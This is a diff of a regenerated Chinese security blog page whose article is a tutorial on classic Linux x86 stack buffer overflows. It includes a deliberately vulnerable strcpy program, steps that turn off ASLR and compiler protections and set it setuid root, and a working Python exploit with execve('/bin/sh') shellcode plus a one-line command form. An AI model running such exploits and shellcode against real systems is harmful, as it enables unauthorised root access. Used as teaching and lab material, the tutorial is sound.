@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -105,12 +105,12 @@
 
 
 <meta name="description" content="gdb使用gdb GNU Project Debugger在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是pedapeda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等  aslr – 显示和设置GDB的aslr checksec – 显示多种安全机制的开关 dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数 dum">
-<meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux栈溢出学习笔记">
 <meta property="og:url" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="gdb使用gdb GNU Project Debugger在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是pedapeda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等  aslr – 显示和设置GDB的aslr checksec – 显示多种安全机制的开关 dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数 dum">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/linux-memory-segment.jpg">
 <meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/stackmap.png">
 <meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/test1.png">
@@ -150,7 +150,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/"/>
+  <link rel="canonical" href="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">
 
 
 
@@ -159,7 +159,7 @@
   <title>linux栈溢出学习笔记 | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -184,13 +184,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -220,7 +220,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -230,7 +230,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -240,7 +240,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -250,7 +250,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -260,7 +260,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -273,7 +273,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -294,9 +294,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -328,16 +326,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -431,7 +429,7 @@
       
 
       
-        <h4 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h4><p>gdb GNU Project Debugger<br>在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是<a href="https://github.com/longld/peda" target="_blank" rel="external">peda</a><br>peda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等</p>
+        <h4 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h4><p>gdb GNU Project Debugger<br>在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是<a href="https://github.com/longld/peda" target="_blank" rel="noopener">peda</a><br>peda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等</p>
 <ul>
 <li>aslr – 显示和设置GDB的aslr</li>
 <li>checksec – 显示多种安全机制的开关</li>
@@ -463,20 +461,20 @@
 <li>2.堆溢出-目的缓冲区是在堆中</li>
 <li>下面这张图展示了linux中内存的分块情况。<br><img src="/2017/08/16/linux栈溢出学习笔记/linux-memory-segment.jpg" alt=""><h2 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h2></li>
 <li><p>缓冲区溢出可以导致任意代码执行</p>
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><h2 id="1-漏洞示例代码"><a href="#1-漏洞示例代码" class="headerlink" title="1.漏洞示例代码"></a>1.漏洞示例代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line">        /* [1] */ char buf[256];</div><div class="line">        /* [2] */ strcpy(buf,argv[1]);</div><div class="line">        /* [3] */ printf(&quot;Input:%s\n&quot;,buf);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><h2 id="1-漏洞示例代码"><a href="#1-漏洞示例代码" class="headerlink" title="1.漏洞示例代码"></a>1.漏洞示例代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//vuln.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">        /* [1] */ char buf[256];</span><br><span class="line">        /* [2] */ strcpy(buf,argv[1]);</span><br><span class="line">        /* [3] */ printf(&quot;Input:%s\n&quot;,buf);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>注：本次测试的是在ubuntu14.04的X86上做的测试。</p>
 </li>
 <li><p>在编译之前我们首先要关闭系统的ASLR 方法是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo -s</div><div class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c //这里编译选项是关闭DEP和stack protector</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c //这里编译选项是关闭DEP和stack protector</span><br><span class="line">$sudo chown root vuln</span><br><span class="line">$sudo chgrp root vuln</span><br><span class="line">$sudo chmod +s vuln</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h2 id="2-如何利用"><a href="#2-如何利用" class="headerlink" title="2.如何利用"></a>2.如何利用</h2><ul>
 <li>任意代码执行使用的技术叫做“覆盖返回地址”，就是攻击者覆盖掉栈中的“返回地址”从而让指令寄存器转向去执行我们构造好的恶意代码。</li>
-<li>在看漏洞的利用代码之前，为了更好的理解，让我们来看一下这段有漏洞的代码的反汇编代码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function main:</div><div class="line">   //Function Prologue</div><div class="line">   0x08048414 &lt;+0&gt;:	push   ebp                      //备份调用者的ebp</div><div class="line">   0x08048415 &lt;+1&gt;:	mov    esp,ebp                 //设置esp和ebp相同</div><div class="line"></div><div class="line">   0x08048417 &lt;+3&gt;:	and    0xfffffff0,esp          //栈对齐</div><div class="line">   0x0804841a &lt;+6&gt;:	sub    0x110,esp               //开辟栈空间</div><div class="line">   0x08048420 &lt;+12&gt;:	mov    0xc(ebp),eax            //eax = argv</div><div class="line">   0x08048423 &lt;+15&gt;:	add    $0x4,eax                 //eax = &amp;argv[1]</div><div class="line">   0x08048426 &lt;+18&gt;:	mov    (eax),eax               //eax = argv[1]</div><div class="line">   0x08048428 &lt;+20&gt;:	mov    eax,0x4(esp)            //拷贝arg2</div><div class="line">   0x0804842c &lt;+24&gt;:	lea    0x10(esp),eax           //eax = &apos;buf&apos; </div><div class="line">   0x08048430 &lt;+28&gt;:	mov    eax,(esp)               //拷贝 arg1</div><div class="line">   0x08048433 &lt;+31&gt;:	call   0x8048330 &lt;strcpy@plt&gt;    //调用 strcpy</div><div class="line">   0x08048438 &lt;+36&gt;:	mov    $0x8048530,eax           //eax = format str &quot;Input: s\n&quot;</div><div class="line">   0x0804843d &lt;+41&gt;:	lea    0x10(esp), edx           //edx = buf</div><div class="line">   0x08048441 &lt;+45&gt;:	mov    edx,0x4(esp)            //printf arg2</div><div class="line">   0x08048445 &lt;+49&gt;:	mov    eax,(esp)               //printf arg1</div><div class="line">   0x08048448 &lt;+52&gt;:	call   0x8048320 &lt;printf@plt&gt;    //调用 printf</div><div class="line">   0x0804844d &lt;+57&gt;:	mov    $0x0,eax                 //return value 0</div><div class="line"></div><div class="line">   //收尾函数</div><div class="line">   0x08048452 &lt;+62&gt;:	leave                            //mov ebp, esp; pop ebp; </div><div class="line">   0x08048453 &lt;+63&gt;:	ret                              //return</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<li>在看漏洞的利用代码之前，为了更好的理解，让我们来看一下这段有漏洞的代码的反汇编代码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   //Function Prologue</span><br><span class="line">   0x08048414 &lt;+0&gt;:	push   ebp                      //备份调用者的ebp</span><br><span class="line">   0x08048415 &lt;+1&gt;:	mov    esp,ebp                 //设置esp和ebp相同</span><br><span class="line"></span><br><span class="line">   0x08048417 &lt;+3&gt;:	and    0xfffffff0,esp          //栈对齐</span><br><span class="line">   0x0804841a &lt;+6&gt;:	sub    0x110,esp               //开辟栈空间</span><br><span class="line">   0x08048420 &lt;+12&gt;:	mov    0xc(ebp),eax            //eax = argv</span><br><span class="line">   0x08048423 &lt;+15&gt;:	add    $0x4,eax                 //eax = &amp;argv[1]</span><br><span class="line">   0x08048426 &lt;+18&gt;:	mov    (eax),eax               //eax = argv[1]</span><br><span class="line">   0x08048428 &lt;+20&gt;:	mov    eax,0x4(esp)            //拷贝arg2</span><br><span class="line">   0x0804842c &lt;+24&gt;:	lea    0x10(esp),eax           //eax = &apos;buf&apos; </span><br><span class="line">   0x08048430 &lt;+28&gt;:	mov    eax,(esp)               //拷贝 arg1</span><br><span class="line">   0x08048433 &lt;+31&gt;:	call   0x8048330 &lt;strcpy@plt&gt;    //调用 strcpy</span><br><span class="line">   0x08048438 &lt;+36&gt;:	mov    $0x8048530,eax           //eax = format str &quot;Input: s\n&quot;</span><br><span class="line">   0x0804843d &lt;+41&gt;:	lea    0x10(esp), edx           //edx = buf</span><br><span class="line">   0x08048441 &lt;+45&gt;:	mov    edx,0x4(esp)            //printf arg2</span><br><span class="line">   0x08048445 &lt;+49&gt;:	mov    eax,(esp)               //printf arg1</span><br><span class="line">   0x08048448 &lt;+52&gt;:	call   0x8048320 &lt;printf@plt&gt;    //调用 printf</span><br><span class="line">   0x0804844d &lt;+57&gt;:	mov    $0x0,eax                 //return value 0</span><br><span class="line"></span><br><span class="line">   //收尾函数</span><br><span class="line">   0x08048452 &lt;+62&gt;:	leave                            //mov ebp, esp; pop ebp; </span><br><span class="line">   0x08048453 &lt;+63&gt;:	ret                              //return</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2017/08/16/linux栈溢出学习笔记/stackmap.png" alt=""></p>
@@ -487,15 +485,15 @@
 <li>就是覆盖掉的地址换成我们恶意代码的入口地址怎么计算，他是0x10c=0x100（就是那256个字节）+0x8（对齐）+0x4（call ebp指令长度）</li>
 <li>因此当我们输入“A”<em>268+“B”</em>4的时候，就会依次覆盖掉buf、对齐、以及call ebp，即返回地址就是“BBBB”<br><img src="/2017/08/16/linux栈溢出学习笔记/test2.png" alt=""><br>正如我们所想！如上我们就控制了返回地址，且这个地址就在0xbfffeeb0这个地址上存放着。<br><img src="/2017/08/16/linux栈溢出学习笔记/test22.png" alt=""></li>
 <li><p>3.编写测试代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Stack address where shellcode is copied.</div><div class="line">ret_addr = 0xbfffeeb0       </div><div class="line">              </div><div class="line">#Spawn a shell</div><div class="line">#execve(/bin/sh)</div><div class="line">scode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack(&quot;&lt;I&quot;,num)</div><div class="line">buf = &quot;A&quot; * 268</div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += &quot;\x90&quot; * 100</div><div class="line">buf += scode</div><div class="line"></div><div class="line">print &quot;Calling vulnerable program&quot;</div><div class="line">call([&quot;./vuln&quot;, buf])</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import struct</span><br><span class="line">from subprocess import call</span><br><span class="line"></span><br><span class="line">#Stack address where shellcode is copied.</span><br><span class="line">ret_addr = 0xbfffeeb0       </span><br><span class="line">              </span><br><span class="line">#Spawn a shell</span><br><span class="line">#execve(/bin/sh)</span><br><span class="line">scode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">#endianess convertion</span><br><span class="line">def conv(num):</span><br><span class="line"> return struct.pack(&quot;&lt;I&quot;,num)</span><br><span class="line">buf = &quot;A&quot; * 268</span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += &quot;\x90&quot; * 100</span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line">print &quot;Calling vulnerable program&quot;</span><br><span class="line">call([&quot;./vuln&quot;, buf])</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>4.结果截图<br><img src="/2017/08/16/linux栈溢出学习笔记/result.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./vuln `python -c &quot;print &apos;A&apos;*268+&apos;\x80\xee\xff\xbf&apos;+&apos;\x90&apos;*100 + &apos;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&apos;&quot;`</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./vuln `python -c &quot;print &apos;A&apos;*268+&apos;\x80\xee\xff\xbf&apos;+&apos;\x90&apos;*100 + &apos;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&apos;&quot;`</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2017/08/16/linux栈溢出学习笔记/commandlineexp.png" alt=""></p>
 <h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
-<li>这里为了测试了简单的缓冲区溢出的基本原理我们关掉了一些防护比如内存地址随机化aslr以及DEP，后面有时间再学习和分享一下绕过这些防护的方法。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="external">Classic Stack Based Buffer Overflow</a><br>[How to exploit a buffer overflow vulnerability - Practical]<br>(<a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="external">https://www.youtube.com/watch?v=hJ8IwyhqzD4</a>)<br><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo" target="_blank" rel="external">Buffer Overflow Attack - Computerphile</a><br><a href="https://www.youtube.com/watch?v=eYrfWpkvMxA" target="_blank" rel="external">Kali Linux 2016.1 - Buffer Overflow Tutorial</a><br><a href="http://blog.csdn.net/21cnbao/article/details/7385161" target="_blank" rel="external">Linux gdb调试器用法全面解析</a><br><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a><br><a href="https://exploit-exercises.com/" target="_blank" rel="external">linux溢出练习</a><br><a href="http://louisrli.github.io/blog/2012/06/22/nebula0/#.WnGH9pP1U0o" target="_blank" rel="external">Nebula Shell Exploits</a><br><a href="https://sploitfun.wordpress.com/2015/" target="_blank" rel="external">Linux (x86) Exploit Development Series</a><br><a href="https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby" target="_blank" rel="external">DEF CON CTF Quals 2015: r0pbaby</a><br><a href="http://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="external">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a><br><a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="external">How to exploit a buffer overflow vulnerability - Practical</a></li>
+<li>这里为了测试了简单的缓冲区溢出的基本原理我们关掉了一些防护比如内存地址随机化aslr以及DEP，后面有时间再学习和分享一下绕过这些防护的方法。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="noopener">Classic Stack Based Buffer Overflow</a><br>[How to exploit a buffer overflow vulnerability - Practical]<br>(<a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=hJ8IwyhqzD4</a>)<br><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo" target="_blank" rel="noopener">Buffer Overflow Attack - Computerphile</a><br><a href="https://www.youtube.com/watch?v=eYrfWpkvMxA" target="_blank" rel="noopener">Kali Linux 2016.1 - Buffer Overflow Tutorial</a><br><a href="http://blog.csdn.net/21cnbao/article/details/7385161" target="_blank" rel="noopener">Linux gdb调试器用法全面解析</a><br><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="noopener">一步一步学ROP之linux_x86篇</a><br><a href="https://exploit-exercises.com/" target="_blank" rel="noopener">linux溢出练习</a><br><a href="http://louisrli.github.io/blog/2012/06/22/nebula0/#.WnGH9pP1U0o" target="_blank" rel="noopener">Nebula Shell Exploits</a><br><a href="https://sploitfun.wordpress.com/2015/" target="_blank" rel="noopener">Linux (x86) Exploit Development Series</a><br><a href="https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby" target="_blank" rel="noopener">DEF CON CTF Quals 2015: r0pbaby</a><br><a href="http://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="noopener">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a><br><a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="noopener">How to exploit a buffer overflow vulnerability - Practical</a></li>
 </ul>
 
       
@@ -533,8 +531,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/18/IDA使用/" rel="next" title="IDA使用">
-                <i class="fa fa-chevron-left"></i> IDA使用
+              <a href="/2017/08/09/Awosome-Hacking系列/" rel="next" title="Awosome Hacking系列">
+                <i class="fa fa-chevron-left"></i> Awosome Hacking系列
               </a>
             
           </div>
@@ -543,8 +541,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/08/09/Awosome-Hacking系列/" rel="prev" title="Awosome Hacking系列">
-                Awosome Hacking系列 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/08/18/IDA使用/" rel="prev" title="IDA使用">
+                IDA使用 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -593,7 +591,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -603,10 +601,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -710,7 +706,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb使用"><span class="nav-number">1.</span> <span class="nav-text">gdb使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简介"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是缓冲区溢出"><span class="nav-number"></span> <span class="nav-text">什么是缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#两种缓冲区溢出"><span class="nav-number"></span> <span class="nav-text">两种缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后果"><span class="nav-number"></span> <span class="nav-text">后果</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#示例"><span class="nav-number">1.</span> <span class="nav-text">示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-漏洞示例代码"><span class="nav-number"></span> <span class="nav-text">1.漏洞示例代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-如何利用"><span class="nav-number"></span> <span class="nav-text">2.如何利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-测试步骤"><span class="nav-number"></span> <span class="nav-text">3.测试步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">1.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">2.</span> <span class="nav-text">Reference</span></a></li></ol></div>
